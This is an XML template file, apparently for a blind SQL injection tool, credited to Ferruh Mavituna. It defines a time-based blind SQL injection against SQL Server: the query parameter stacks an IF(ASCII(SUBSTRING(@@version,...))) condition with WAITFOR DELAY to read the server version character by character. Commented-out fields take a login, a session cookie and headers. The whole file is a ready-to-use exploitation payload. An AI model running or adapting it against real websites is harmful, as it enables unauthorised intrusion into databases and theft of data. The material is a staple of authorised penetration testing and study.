﻿<bsql>
  <author>
    Ferruh Mavituna - http://ferruh.mavituna.com
  </author>
  <name>Template - SQL Server - Full Blind SQL Injection</name>
  <comments>
    Time based attacks Blind SQL Injection exploitation sample for SQL Server
  </comments>
  <query>
    <![CDATA[
    {{URL:Enter the URL of websites like http://www.example.com/}}?p=1;IF(ISNULL(ASCII(SUBSTRING((@@version),{POSITION},1)),0){OPERATION}{CHAR}) WAITFOR DELAY '0:0:{SECONDS}'--
    ]]>
  </query>
  <detectiontype><![CDATA[FullBlind]]></detectiontype>
<!-- 
<post>
    <![CDATA[
    user={{username:Yout login name}}&pass={{pass:Your password}}&someothershit=asdasdasd askdjhaksjdasd=asdas
    ]]>
  </post>
  <cookie>
    ASPSESSIONID={{SESSIONDID:Enter your session identifier}};    
  </cookie>
  <header>
    testheader: xxxxx
    test2: yyyyy
  </header>
  -->
</bsql>